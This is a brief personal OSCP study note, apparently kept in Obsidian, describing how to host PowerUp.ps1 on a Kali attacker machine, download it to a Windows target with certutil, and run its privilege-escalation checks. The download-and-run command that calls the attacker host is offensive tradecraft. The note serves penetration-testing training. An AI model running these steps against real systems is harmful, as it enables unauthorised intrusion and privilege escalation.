
Transfer PowerUp.ps1 from KALI ATTACKER to WINDOWS TARGET

On KALI ATTACKER
```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

On WINDOWS TARGET
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}/PowerUp.ps1 PowerUp.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```powershell
.\PowerUp.ps1; Invoke-AllChecks
```

